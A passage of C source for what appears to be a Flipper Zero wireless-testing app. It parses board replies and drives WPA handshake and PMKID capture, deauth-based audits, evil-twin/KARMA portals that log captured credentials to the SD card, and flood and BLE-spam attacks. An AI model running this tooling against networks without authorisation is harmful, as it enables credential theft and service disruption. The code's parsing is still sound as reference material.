void uart_process_line(FuriString* line, void* context);

// UART worker side: take a copy of the line and hand it to the dispatcher thread. Never touch scene
// state from here. If the queue is full we retry, but keep checking the worker's exit flag so that
// closing the app cannot deadlock on a queue nobody drains any more.
static void uart_enqueue_line(FuriString* line, void* context) {
    Petrel* app = context;
    if(uart_helper_worker_is_stopping()) return;
    diag(11, (uint32_t)furi_string_size(line), 0);   // about to copy a line into the queue
    FuriString* copy = furi_string_alloc_set(line);
    for(;;) {
        if(uart_helper_worker_is_stopping()) {
            furi_string_free(copy);
            return;
        }
        if(furi_message_queue_put(app->uart_lines, &copy, furi_ms_to_ticks(10)) == FuriStatusOk) {
            return; // the queue owns copy now
        }
    }
}

// M0.3: decoded DP_SCAN_AP frame -> reformat to the canonical "AP:" line and enqueue on the SAME
// GUI-thread queue the ASCII path uses. wifiList therefore stays written only on the GUI thread (no
// worker-vs-GUI race, per the wifiList comments) and the existing AP: parser handles it unchanged.
// Runs on the UART worker thread. Payload: idx|total|bssid[6]|ch|sec(u32 LE)|rssi(i16 LE)|ssid_len|ssid.
static void petrel_scan_frame(uint8_t type, const uint8_t* p, uint16_t len, void* context) {
    Petrel* app = context;
    if(type != DP_SCAN_AP || len < 2) return;
    uint8_t idx = p[0];
    uint8_t total = p[1];
    if(total == 0) return; // empty-list marker, nothing to add
    if(len < 16) return; // idx,total,bssid[6],ch,sec(4),rssi(2) = 15, then ssid_len at [15]
    uint8_t sl = p[15];
    if(sl > 32) sl = 32;
    if(len < (uint16_t)(16 + sl)) return;
    int16_t rssi = (int16_t)((uint16_t)p[13] | ((uint16_t)p[14] << 8));
    uint32_t sec = (uint32_t)p[9] | ((uint32_t)p[10] << 8) | ((uint32_t)p[11] << 16) |
                   ((uint32_t)p[12] << 24);
    // Sanitise SSID to printable, non-'|' so a binary SSID cannot corrupt the '|'-delimited AP: line.
    char ssid[33];
    for(uint8_t i = 0; i < sl; i++) {
        char c = (char)p[16 + i];
        ssid[i] = (c >= 0x20 && c < 0x7f && c != '|') ? c : '?';
    }
    ssid[sl] = '\0';
    char linebuf[128];
    snprintf(
        linebuf,
        sizeof(linebuf),
        "AP:%u|%s|%02X:%02X:%02X:%02X:%02X:%02X|%u|%u|%d",
        (unsigned)idx,
        ssid,
        p[2], p[3], p[4], p[5], p[6], p[7],
        (unsigned)p[8],
        (unsigned)sec,
        (int)rssi);
    FuriString* fs = furi_string_alloc_set_str(linebuf);
    uart_enqueue_line(fs, app); // copies into the GUI queue; parsed into wifiList there
    furi_string_free(fs);
    scan_expect_total = total;   // GUI thread persists the list once it has parsed this many APs
}

// Dispatcher thread: drain what the worker queued, and finish the scan wait. One line per call so
// that custom events posted by the line handlers are serviced in between.
static void uart_gui_tick(void* context) {
    Petrel* app = context;
    // M4: night LED auto-off. The Flipper has an RTC; the board does not. Once a minute, if we are
    // in the night window (22:00-06:59) tell the board to go dark ("LED OFF" latches led_quiet so
    // status blinks stay off too), and "LED ON" (resume) when day returns. Edge-triggered: one
    // command only on the day<->night boundary (and once on app open to sync).
    {
        static uint32_t led_night_last = 0;
        static int led_night_state = -1;  // -1 unknown, 0 day, 1 night
        uint32_t nowt = furi_get_tick();
        if(led_night_last == 0 || (nowt - led_night_last) >= furi_ms_to_ticks(60000)) {
            led_night_last = nowt;
            DateTime dt;
            furi_hal_rtc_get_datetime(&dt);
            int night = (dt.hour >= 22 || dt.hour < 7) ? 1 : 0;
            if(night != led_night_state) {
                led_night_state = night;
                uart_helper_send(app->uart_helper, night ? "LED OFF\n" : "LED ON\n", night ? 8 : 7);
            }
        }
    }
    // Drain the app-owned event ring FIRST. These are the events the producers (this tick, the
    // UART line handlers, the timer callbacks) must not hand to the dispatcher directly, because
    // view_dispatcher_send_custom_event() blocks forever on a full queue. The scene manager runs
    // exactly the on_event handlers the dispatcher would have run, just without the 16-slot queue.
    uint32_t ev;
    for(int i = 0; i < 16; i++) {
        if(!take_event(&ev)) break;
        // Route through the dispatcher's custom-event callback: it owns the outcomes shared by every
        // screen (result view, popup scene, credentials + vibration) and it ends with
        // "return scene_manager_handle_custom_event(...)", so a scene event still reaches the current
        // scene. Calling scene_manager directly - as the ring did since item #1 - bypassed all of
        // that and silently killed every popup and the results view.
        // ONE call. An earlier attempt did "callback first, fall back if it returns false", which
        // runs an unconsumed scene event twice (and possibly against a different current scene once
        // the first call has moved it).
        diag(4, ev, 0);
        (void)Petrel_custom_callback(app, ev);
    }
    // Self-test driver (architect D.5): one step when due. Longer pauses around the scan so the
    // board has time to answer, which is what the production flow waits for too.
    if(st_active) {
        uint32_t nowt = furi_get_tick();
        if((int32_t)(nowt - st_due) >= 0) {
            st_due = nowt + furi_ms_to_ticks((st_step == 2 || st_step == 3) ? 1500 : 300);
            selftest_step(app);
        }
    }
    // One heap/queue sample per second: the leak detector. free_now is the live free heap, largest
    // the biggest allocatable block. boot_min (memmgr_get_minimum_free_heap) is a low-water mark
    // SINCE BOOT: it can never recover, so a falling boot_min on its own proves nothing. A leak is a
    // sustained decline of free_now/largest across equivalent phases, which is why the sample now
    // records the phase it was taken in.
    {
        static uint32_t last_sample = 0;
        uint32_t nowt = furi_get_tick();
        if((uint32_t)(nowt - last_sample) >= furi_ms_to_ticks(1000)) {
            last_sample = nowt;
            // Phase-tagged (architect's soak requirement): the sample carries the scene and whether
            // a scan is in flight, so equivalent phases can be compared across laps for a leak.
            diag(1, (uint32_t)scene_manager_get_current_scene(app->scene_manager),
                 app->scan_waiting ? 1u : 0u);
        }
    }
    // Re-identify an unidentified board. The app learns the capability string once, from the reply
    // to HELLO at startup - so if the board happened to be silent right then (mid-boot, or held in
    // ROM download mode by a test), fw_caps stayed empty for the rest of the session and, since
    // item 0.6, every capability-gated row disappeared with no way back. Ask again until it
    // answers, a few seconds apart, and stop as soon as we have an identity.
    if(app->fw_caps[0] == '\0' && app->ident_attempts < 3) petrel_ident(app);
    // A failed save is worth interrupting for - the alternative was silence, so the user believed
    // the artifact was on the card. Consumed ONCE per failure via the sequence number, never once
    // per tick: each popup pushes a scene, and the scene history has no depth limit.
    static uint32_t storage_seen = 0;
    if(storage_fail_seq != storage_seen) {
        storage_seen = storage_fail_seq;
        furi_mutex_acquire(storage_mutex, FuriWaitForever);
        snprintf(message, sizeof(message), "%s", storage_status);
        furi_mutex_release(storage_mutex);
        snprintf(popupHeader, sizeof(popupHeader), "SD problem");
        post_event(app, PETREL_EVT_POPUP);
    }
    FuriString* line;
    // Several lines per tick. This callback runs on the dispatcher (GUI) thread, and with a 10 ms
    // period eight lines per tick is 800 lines/s - far past anything the board emits, at a fraction
    // of the overhead.
    for(int i = 0; i < 8; i++) {
        if(furi_message_queue_get(app->uart_lines, &line, 0) != FuriStatusOk) break;
        uart_process_line(line, app);
        furi_string_free(line);
    }
    // The whole scanned list has been parsed: persist it now instead of waiting for the user to open
    // "List Wifi". Runs on the GUI thread, where wifiList is owned, and petrel_save_wifi_list() has
    // its own low-heap guard.
    // "Or the list is full": a dense RF environment can exceed WIFI_MAX, and the parser stops at 48
    // entries, so waiting for wifiCount to reach the board's `total` would never save anything.
    if(scan_expect_total &&
       (app->wifiCount >= scan_expect_total || app->wifiCount >= WIFI_MAX)) {
        scan_expect_total = 0;
        petrel_save_wifi_list(app);
    }
    if(app->scan_waiting &&
       (scanFinish || scanFailed || (int32_t)(furi_get_tick() - app->scan_deadline) >= 0)) {
        uint32_t reason = scanFailed ? 2u : scanFinish ? 1u : 3u;
        diag(30, 2, reason); /* completion: OK=1, FAIL=2, deadline=3 */
        app->scan_waiting = false;

        if(scanFailed || !scanFinish) {
            // Architect: the deadline WITHOUT a SCAN:OK reply used to enter the SUCCESS branch and
            // send LIST as if fresh results existed - the exact trust bug (0.10/0.12 family). A
            // timed-out scan is now an explicit failure.
            snprintf(message, sizeof(message), "%s\n",
                     scanFailed ? "Scan failed - try again" :
                                  "Scan timed out - no board reply");
            snprintf(popupHeader, sizeof(popupHeader), "Error");
            diag(31, 1, 0); /* failure previous_scene begin */
            bool popped = scene_manager_previous_scene(app->scene_manager);
            diag(31, 1, popped ? 1u : 2u);
            diag(32, 1, 0); /* popup post begin */
            post_event(app, PETREL_EVT_POPUP);
            diag(32, 1, 1);
        } else {
            diag(30, 3, 0); /* submenu reset begin */
            submenu_reset(app->submenu);
            diag(30, 3, 1);
            diag(33, 2, 0); /* LIST send begin */
            uart_helper_send(app->uart_helper, "LISTB\n", 6); // M0.3: binary DP_SCAN_AP list
            diag(33, 2, 1);
            diag(31, 2, 0); /* success previous_scene begin */
            bool popped = scene_manager_previous_scene(app->scene_manager);
            diag(31, 2, popped ? 1u : 2u);
        }
        diag(30, 4, 0); /* completion block returned */
    }
}

void uart_process_line(FuriString* line, void* context) {
    diag(17, (uint32_t)furi_string_size(line), 0);   // input line size
    FURI_LOG_D(TAG, __func__);
    FURI_LOG_D(TAG, "%s", furi_string_get_cstr(line));
    Petrel* app = context;
    {
        // D.4/2 lifecycle breadcrumbs (architect patch 7): the board reports one line per state
        // entry, "D4:<cycle>:<state>:<board_ms>". Kind 21 records cycle/state next to the Flipper's
        // own heap fields, so the USB transcript keeps board timing and the SD keeps the timeline.
        // No storage work is added to this UART callback.
        unsigned long cycle, state, board_ms;
        if(sscanf(furi_string_get_cstr(line), "D4:%lu:%lu:%lu",
                  &cycle, &state, &board_ms) == 3) {
            diag(21, (uint32_t)cycle, (uint32_t)state);
            return;
        }
        // Worker completion (D.4/2): "RD4:<gen>:<op>:<rc>:<w0>:<w1>:<hwm>". b stores rc in two's
        // complement (a negative rc = the call itself failed); the raw USB line keeps w0/w1/hwm.
        unsigned long gen, w0, w1, hwm;
        int rc, opi;
        if(sscanf(furi_string_get_cstr(line), "RD4:%lu:%d:%d:%lu:%lu:%lu",
                  &gen, &opi, &rc, &w0, &w1, &hwm) == 6) {
            diag(22, (uint32_t)opi, (uint32_t)(int32_t)rc);
            return;
        }
    }
    if(strncmp(furi_string_get_cstr(line), "AP:", 3) == 0) {
        if(app->wifiCount >= WIFI_MAX) return; // fixed-size list full
        char buffer[128];
        strncpy(buffer, furi_string_get_cstr(line), sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';

        char* _sv = NULL;
        char* token = petrel_strtok(buffer, ":|", &_sv); // Omitir "AP:"
        if(!token) return;
        APDetails* newAP = &app->wifiList[app->wifiCount]; // BSS slot, no heap

        token = petrel_strtok(NULL, "|", &_sv); // ID del AP
        if(!token) return;
        newAP->idAP = atoi(token);

        token = petrel_strtok(NULL, "|", &_sv); // SSID
        if(!token) return;
        strncpy(newAP->APssid, token, sizeof(newAP->APssid) - 1);
        newAP->APssid[sizeof(newAP->APssid) - 1] = '\0';

        token = petrel_strtok(NULL, "|", &_sv); // BSSID
        if(!token) return;
        strncpy(newAP->APbssid, token, 17);
        newAP->APbssid[17] = '\0';

        token = petrel_strtok(NULL, "|", &_sv); // Canal
        if(!token) return;
        newAP->chanel = atoi(token);

        token = petrel_strtok(NULL, "|", &_sv); // security
        if(!token) return;
        newAP->security = atoi(token);

        token = petrel_strtok(NULL, "|", &_sv); // RSSI
        if(!token) return;
        newAP->rssi = atoi(token);

        newAP->deauth = false;

        app->wifiCount++;
    } else if(strncmp(furi_string_get_cstr(line), "SCAN:OK", 7) == 0) {
        scanFinish = true;
        FURI_LOG_D(TAG, "SCAN FINISH");
    } else if(strncmp(furi_string_get_cstr(line), "SCAN:FAIL", 9) == 0) {
        scanFailed = true;
        FURI_LOG_D(TAG, "SCAN FAILED (board)");
    } else if(strncmp(furi_string_get_cstr(line), "EV:", 3) == 0) {
        char buffer[128];
        strncpy(buffer, furi_string_get_cstr(line), sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';
        char* _sv = NULL;
        char* token = petrel_strtok(buffer, ":|", &_sv); // Omitir "EV:"
        if(!token) return;
        token = petrel_strtok(NULL, "|", &_sv);
        if(!token) return;
        if(strlen(credentials) + strlen(token) + 2 < sizeof(credentials)) {
            petrel_strcat(credentials, token);
            petrel_strcat(credentials, "\n");
        }
        creds_append_sd(token);   // also persist to /ext/petrel/creds.txt
        post_event(app, PETREL_EVT_CREDS);
    } else if(strncmp(furi_string_get_cstr(line), "ERROR:", 6) == 0) {
        char buffer[128];
        strncpy(buffer, furi_string_get_cstr(line), sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';
        char* _sv = NULL;
        char* token = petrel_strtok(buffer, ":", &_sv);
        if(!token) return;
        token = petrel_strtok(NULL, "|", &_sv);
        if(!token) return;

        if(batch_active) {
            // E3: a rejected HSGRAB (unreachable/unparseable target) must not abort the queue -
            // record the miss and move straight on to the next AP.
            batch_note(0);
            batch_seq++;
            batch_step(app);
        } else {
            snprintf(message, sizeof(message), "%s", token);
            snprintf(popupHeader, sizeof(popupHeader), "ERROR");
            post_event(app, PETREL_EVT_POPUP);
        }
    } else if(strncmp(furi_string_get_cstr(line), "HSCAP:", 6) == 0) {
        // Board header before a HSFRAME dump: "HSCAP: ch=N count=N".
        hs_count = 0;
        const char* s = strstr(furi_string_get_cstr(line), "ch=");
        hs_channel = s ? atoi(s + 3) : 0;
    } else if(strncmp(furi_string_get_cstr(line), "HSFRAME:", 8) == 0) {
        const char* hex = furi_string_get_cstr(line) + 8;
        if(hs_count < HS_MAX_FRAMES) {
            uint16_t n = 0;
            const char* p = hex;
            bool clean = true;
            for(; p[0] && n < HS_FRAME_MAX; p += 2) {
                int hi = hs_hexval(p[0]);
                int lo = p[1] ? hs_hexval(p[1]) : -1;   // odd trailing nibble -> not clean
                if(hi < 0 || lo < 0) { clean = false; break; }
                hs_frames[hs_count][n++] = (uint8_t)((hi << 4) | lo);
            }
            if(*p) clean = false;   // leftover hex (invalid byte, or frame exceeds HS_FRAME_MAX)
            // Keep only a line that decoded IN FULL. A garbled/truncated line is dropped rather than
            // stored as a corrupt prefix that would fail validation AND consume one of 16 slots.
            if(clean && n > 0) {
                hs_lens[hs_count] = n;
                hs_count++;
            }
        }
    } else if(
        strncmp(furi_string_get_cstr(line), "CSASTAS:", 8) == 0 ||
        strncmp(furi_string_get_cstr(line), "BTMSTAS:", 8) == 0 ||
        strncmp(furi_string_get_cstr(line), "AUTHFLOOD:", 10) == 0 ||
        strncmp(furi_string_get_cstr(line), "ASSOCFLOOD:", 11) == 0 ||
        strncmp(furi_string_get_cstr(line), "SAEFLOOD:", 9) == 0) {
        // The board confirms a management-action burst. Only the unicast (second) pass is
        // watched: BTM/CSA always print their own line first, and two popups would stack.
        snprintf(message, sizeof(message), "%s", furi_string_get_cstr(line));
        snprintf(popupHeader, sizeof(popupHeader), "Sent");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "HSDONE:", 7) == 0) {
        uint16_t written = 0;
        if(batch_active) {
            // E3: this AP is finished - give it its own pcap and arm the next one. No popup: the
            // busy screen stays up and doubles as the progress display.
            char path[128];
            snprintf(
                path,
                sizeof(path),
                "/ext/petrel/sessions/%s/batch_%u.pcap",
                petrel_session_id,
                (unsigned)(batch_seq + 1));
            hs_write_pcap(path, &written, NULL);
            if(written) batch_good++;
            batch_note((int)written);
            batch_seq++;
            batch_step(app);
        } else {
            char qual[48], hist[72];
            bool saved = false;
            char hp[160];
            if(audit_mode) {
                // Audit evidence -> the run's session dir (unique, not the overwritten root
                // /ext/petrel/hs.pcap), written synchronously so `saved` is the real outcome.
                petrel_artifact_path(hp, sizeof(hp), "hs.pcap");
                hs_write_pcap(hp, &written, &saved);
            } else {
                snprintf(hp, sizeof(hp), "/ext/petrel/hs.pcap");
                hs_write_pcap(hp, &written, NULL);
            }
            bool complete = hs_quality(qual, sizeof(qual), hist, sizeof(hist));
            if(audit_mode)
                audit_write_json("handshake", (int)written, complete, saved, qual, hist);
            snprintf(
                message,
                sizeof(message),
                "%u EAPOL: %s\nch %d -> %s%s",
                (unsigned)written,
                qual,
                hs_channel,
                audit_mode ? "session dir" : "/ext/petrel/hs.pcap",
                (audit_mode && !saved) ? " (NOT saved!)" : "");
            snprintf(popupHeader, sizeof(popupHeader), "Capture done");
            post_event(app, PETREL_EVT_POPUP);
        }
    } else if(strncmp(furi_string_get_cstr(line), "PMFDONE:", 8) == 0) {
        if(audit_mode && audit_phase == AUDIT_PHASE_PMF) {
            // Guided audit, PMF scan done. Decide whether the AP is PMF-required (from its PMF: line,
            // else the coarse security bits). Required -> deauth is useless -> PMKID now, no need to
            // enumerate stations. Deauthable -> run STASCAN and decide handshake-vs-PMKID on STADONE.
            audit_phase = AUDIT_PHASE_NONE;
            if(!busy_active) { audit_mode = false; return; }   // user left during the scan
            bool pmf_required = audit_pmf_seen ?
                                    audit_pmf_req :
                                    ((audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED));
            if(pmf_required) {
                audit_send_grab(app, AUDIT_METHOD_PMKID);
            } else {
                char cmd[48];
                snprintf(cmd, sizeof(cmd), "STASCAN %d %s 8\n", audit_ch, audit_hex);
                uart_helper_send(app->uart_helper, cmd, strlen(cmd));
                audit_phase = AUDIT_PHASE_STA;
                busy_total_s = 8;
                busy_ticks = 0;   // re-arm the per-phase watchdog for the STA scan
                snprintf(popupHeader, sizeof(popupHeader), "Audit: stations");
                snprintf(message, sizeof(message), "STA scan ch %d...", audit_ch);
            }
            return;
        }
        if(!busy_active) return;   // stale/cancelled scan reply: don't yank the UI to recon
        snprintf(recon_title, sizeof(recon_title), "PMF / WPA3");
        const char* s = strstr(furi_string_get_cstr(line), "aps=");
        sess_pmf = s ? atoi(s + 4) : 0;
        petrel_save_scan("pmf", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "PMF:", 4) == 0) {
        // A6: classify "<mac>|<ssid>|akm=N|sae=N|mfp=cap|req" into a WPA3/WPA2 verdict so the
        // recon view reads like an inventory (and transition-mode downgrades stand out).
        const char* s = furi_string_get_cstr(line) + 4;
        // Metadata starts after the SSID field: an SSID containing "mfp=req" must not override the
        // real value, so search only past the second '|'.
        const char* meta = s;
        for(int f = 0; f < 2 && meta; f++) {
            meta = strchr(meta, '|');
            if(meta) meta++;
        }
        if(!meta) meta = s + strlen(s);
        if(audit_mode && audit_phase == AUDIT_PHASE_PMF) {
            // Audit PMF scan: capture only the target AP's PMF posture; skip recon_append so the
            // other on-channel APs don't pollute recon_text (a cancelled fall-through shows it).
            if(audit_bssid_valid && pmf_line_is_target(s)) {
                audit_pmf_seen = true;
                const char* m = strstr(meta, "mfp=");
                audit_pmf_req = m && !strncmp(m + 4, "req", 3);
            }
            return;
        }
        const char* sae = strstr(meta, "sae=");
        const char* mfp = strstr(meta, "mfp=");
        int sae_v = sae ? atoi(sae + 4) : 0;
        const char* cls;
        if(sae_v && mfp && !strncmp(mfp + 4, "req", 3)) {
            cls = "WPA3-only";
        } else if(sae_v) {
            cls = "WPA3(PMFcap)";
        } else if(mfp && !strncmp(mfp + 4, "cap", 3)) {
            cls = "WPA2+PMFcap";
        } else {
            cls = "WPA2";
        }
        char out[96];
        snprintf(out, sizeof(out), "%.60s %s", s, cls);
        recon_append(out);
    } else if(strncmp(furi_string_get_cstr(line), "STADONE:", 8) == 0) {
        if(audit_mode && audit_phase == AUDIT_PHASE_STA) {
            // Guided audit, station scan done (only reached for a deauthable AP). Stations present ->
            // deauth-assisted handshake; none -> clientless PMKID. audit_pick_method is the single
            // source of truth (here pmf_required is false, so it reduces to the station test).
            audit_phase = AUDIT_PHASE_NONE;
            if(!busy_active) { audit_mode = false; return; }   // user left during the scan
            const char* s = strstr(furi_string_get_cstr(line), "n=");
            audit_stas = s ? atoi(s + 2) : 0;
            AuditMethod m = audit_pick_method(
                audit_pmf_seen,
                audit_pmf_req,
                (audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED),
                audit_stas);
            audit_send_grab(app, m);
            return;
        }
        if(!busy_active) return;   // stale/cancelled scan reply: don't yank the UI to recon
        snprintf(recon_title, sizeof(recon_title), "Stations");
        const char* s = strstr(furi_string_get_cstr(line), "n=");
        sess_stas = s ? atoi(s + 2) : 0;
        petrel_save_scan("stations", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "STA:", 4) == 0) {
        recon_append(furi_string_get_cstr(line) + 4);
    } else if(strncmp(furi_string_get_cstr(line), "DEAUTHDONE:", 11) == 0) {
        snprintf(recon_title, sizeof(recon_title), "Deauth IDS");
        const char* s = strstr(furi_string_get_cstr(line), "n=");
        sess_deauth = s ? atoi(s + 2) : 0;
        petrel_save_scan("deauth_ids", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "DEAUTH:", 7) == 0) {
        recon_append(furi_string_get_cstr(line) + 7);
    } else if(strncmp(furi_string_get_cstr(line), "CLIDONE:", 8) == 0) {
        // A2: the board finished the tracker window - keep the timeline in the session folder.
        snprintf(recon_title, sizeof(recon_title), "Client tracker");
        petrel_save_scan("clients", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "CLI:", 4) == 0) {
        recon_append(furi_string_get_cstr(line) + 4);
    } else if(strncmp(furi_string_get_cstr(line), "PROBEDONE:", 10) == 0) {
        snprintf(recon_title, sizeof(recon_title), "Probe / PNL");
        const char* s = strstr(furi_string_get_cstr(line), "n=");
        sess_probes += s ? atoi(s + 2) : 0;
        petrel_save_scan("probe", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "PROBE:", 6) == 0) {
        recon_append(furi_string_get_cstr(line) + 6);
    } else if(strncmp(furi_string_get_cstr(line), "CSASTAS:", 8) == 0) {
        // B2b: per-station unicast announcements
        snprintf(popupHeader, sizeof(popupHeader), "CSA unicast");
        snprintf(message, sizeof(message), "Sent to %s stations", furi_string_get_cstr(line) + 8);
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "CSA:", 4) == 0) {
        // B2: what the board actually sent
        snprintf(popupHeader, sizeof(popupHeader), "CSA");
        snprintf(message, sizeof(message), "Sent %s", furi_string_get_cstr(line) + 4);
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "APCLONE:", 8) == 0) {
        snprintf(message, sizeof(message), "Cloned %s", furi_string_get_cstr(line) + 8);
        snprintf(popupHeader, sizeof(popupHeader), "AP clone");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "PROBEFLOOD:", 11) == 0) {
        snprintf(message, sizeof(message), "Sent %s probes", furi_string_get_cstr(line) + 11);
        snprintf(popupHeader, sizeof(popupHeader), "Probe flood");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "RECDONE:", 8) == 0) {
        // F5: the board finished dumping the recording - save it as a runnable script.
        rec_save(app);
    } else if(strncmp(furi_string_get_cstr(line), "REC:", 4) == 0) {
        if(rec_script_n < REC_SCRIPT_MAX) {
            snprintf(rec_script[rec_script_n], sizeof(rec_script[0]), "%s", furi_string_get_cstr(line) + 4);
            rec_script_n++;
        }
    } else if(strncmp(furi_string_get_cstr(line), "RECCTL:", 7) == 0 ||
              strncmp(furi_string_get_cstr(line), "RECN:", 5) == 0) {
        // F5: recorder acks / live count - nothing to do until the list is fetched
    } else if(strncmp(furi_string_get_cstr(line), "KARMALIST:", 10) == 0) {
        // B1: "<n>|ssid|ssid|..." - the KARMA scene renders this live, and the list is persisted
        // to the run's session folder (once per change, not once per poll).
        snprintf(karma_list, sizeof(karma_list), "%s", furi_string_get_cstr(line) + 10);
        if(strcmp(karma_list, karma_saved) != 0) {
            snprintf(karma_saved, sizeof(karma_saved), "%s", karma_list);
            char body[192];
            int o = 0;
            const char* q = strchr(karma_list, '|');
            while(q && o < 150) {
                const char* e = strchr(q + 1, '|');
                int l = e ? (int)(e - q - 1) : (int)strlen(q + 1);
                if(l > 0) o += snprintf(body + o, sizeof(body) - (size_t)o, "%.*s\n", l, q + 1);
                q = e;
            }
            petrel_save_scan("karma", o > 0 ? body : "(none)\n");
        }
        post_event(app, PETREL_EVT_KARMA);
    } else if(strncmp(furi_string_get_cstr(line), "KARMA:", 6) == 0) {
        // on/off ack - the scene shows live state from the KARMALIST polls instead
    } else if(strncmp(furi_string_get_cstr(line), "TRAPSTAT:", 9) == 0) {
        // C1: "on ch=6 ap=<ssid> seen=N" - keep the Trap screen honest even if the one-shot
        // TRAP event was missed (e.g. the app entered the screen after the AP was already up).
        const char* ap = strstr(furi_string_get_cstr(line), "ap=");
        if(ap) {
            ap += 3;
            if(*ap == '-') {
                trap_state[0] = '\0';
            } else {
                const char* sp = strchr(ap, ' ');
                int l = sp ? (int)(sp - ap) : (int)strlen(ap);
                if(l > 0 && l < (int)sizeof(trap_state)) {
                    snprintf(trap_state, sizeof(trap_state), "%.*s", l, ap);
                }
            }
            post_event(app, PETREL_EVT_KARMA);
        }
    } else if(strncmp(furi_string_get_cstr(line), "TRAPCTL:", 8) == 0) {
        // C1: Trap on/off ack
    } else if(strncmp(furi_string_get_cstr(line), "TRAP:", 5) == 0) {
        // C1: the board cloned a network for real - show which one on the Trap screen and record
        // it (with the portal that was armed) in the run's session folder.
        snprintf(trap_state, sizeof(trap_state), "%s", furi_string_get_cstr(line) + 5);
        {
            char body[96];
            snprintf(
                body,
                sizeof(body),
                "cloned AP: %s\nportal: %s\n",
                trap_state,
                captive_portals[app->captivePortal]);
            petrel_save_scan("trap", body);
        }
        post_event(app, PETREL_EVT_KARMA);
    } else if(strncmp(furi_string_get_cstr(line), "TRAPFAIL", 8) == 0) {
        snprintf(trap_state, sizeof(trap_state), "(clone failed - still KARMA)");
        post_event(app, PETREL_EVT_KARMA);
    } else if(strncmp(furi_string_get_cstr(line), "PORTALHASH:", 11) == 0) {
        // Reply to our PORTALHASH request: len + FNV-1a of what the board actually holds.
        // (Parsed with strtol — sscanf is not in the firmware export table.)
        const char* s = furi_string_get_cstr(line) + 11;
        char* endp = NULL;
        unsigned len = (unsigned)strtol(s, &endp, 10);
        unsigned long h = (endp && *endp == ':') ? (unsigned long)strtol(endp + 1, NULL, 16) : 0;
        bool ok = (len == (unsigned)portal_exp_len) && (h == (unsigned long)portal_exp_hash);
        snprintf(popupHeader, sizeof(popupHeader), ok ? "Portal OK" : "Portal MISMATCH");
        snprintf(message, sizeof(message), "SD %u / board %u B", (unsigned)portal_exp_len, len);
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "PMKIDDONE:", 10) == 0) {
        if(audit_mode) {
            // wpa_lines holds only validated, target-bound PMKID records (pmkid_line_valid). Write
            // them synchronously so the audit states whether the hashes actually reached the card.
            bool got = wpa_lines[0] != '\0';
            bool saved = got ? write_wpa_file(true) : false;
            audit_write_json("pmkid", 0, got, saved, got ? "PMKID" : "no PMKID", "");
        } else {
            write_wpa_file(false);
        }
        snprintf(recon_title, sizeof(recon_title), "PMKID");
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "PMKID:", 6) == 0 ||
              strncmp(furi_string_get_cstr(line), "WPA*01*", 7) == 0) {
        const char* s = furi_string_get_cstr(line);
        recon_append(s);
        if(pmkid_line_valid(s) &&   // only store a well-formed, non-degenerate PMKID
           strlen(wpa_lines) + strlen(s) + 2 < sizeof(wpa_lines)) {
            petrel_strcat(wpa_lines, s);
            petrel_strcat(wpa_lines, "\n");
        }
    } else if(strncmp(furi_string_get_cstr(line), "IDENT:", 6) == 0) {
        // A: board capability/version advertisement (HELLO response).
        const char* s = furi_string_get_cstr(line);
        const char* fw = strstr(s, "fw=");
        if(fw) {
            const char* e = strchr(fw + 3, ';');
            size_t n = e ? (size_t)(e - (fw + 3)) : strlen(fw + 3);
            if(n >= sizeof(app->fw_version)) n = sizeof(app->fw_version) - 1;
            memcpy(app->fw_version, fw + 3, n);
            app->fw_version[n] = '\0';
        }
        const char* cp = strstr(s, "caps=");
        if(cp) {
            const char* e = strchr(cp + 5, ';');
            size_t n = e ? (size_t)(e - (cp + 5)) : strlen(cp + 5);
            if(n >= sizeof(app->fw_caps)) n = sizeof(app->fw_caps) - 1;
            memcpy(app->fw_caps, cp + 5, n);
            app->fw_caps[n] = '\0';
            diag(20, (uint32_t)n, 0);                    // caps received
            post_event(app, PETREL_EVT_REIDENTIFIED);   // let the current menu rebuild
        }
        FURI_LOG_I(TAG, "IDENT fw=%s caps=%s", app->fw_version, app->fw_caps);
    } else if(strncmp(furi_string_get_cstr(line), "BLEDONE:", 8) == 0) {
        snprintf(recon_title, sizeof(recon_title), "BLE");
        petrel_save_scan("ble", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "BLESPAM:", 8) == 0) {
        // reply is "BLESPAM:off <count>" -> show just the count
        const char* s = furi_string_get_cstr(line) + 8;
        const char* sp = strchr(s, ' ');
        snprintf(message, sizeof(message), "Sent %s payloads", sp ? sp + 1 : s);
        snprintf(popupHeader, sizeof(popupHeader), "BLE spam");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "GATT:done", 9) == 0) {
        snprintf(recon_title, sizeof(recon_title), "GATT");
        petrel_save_scan("gatt", recon_text);
        post_event(app, PETREL_EVT_RECON);
    } else if(strncmp(furi_string_get_cstr(line), "GATT:connect-failed", 19) == 0) {
        snprintf(message, sizeof(message), "Connect failed");
        snprintf(popupHeader, sizeof(popupHeader), "GATT");
        post_event(app, PETREL_EVT_POPUP);
    } else if(strncmp(furi_string_get_cstr(line), "GATT:", 5) == 0) {
        recon_append(furi_string_get_cstr(line) + 5);
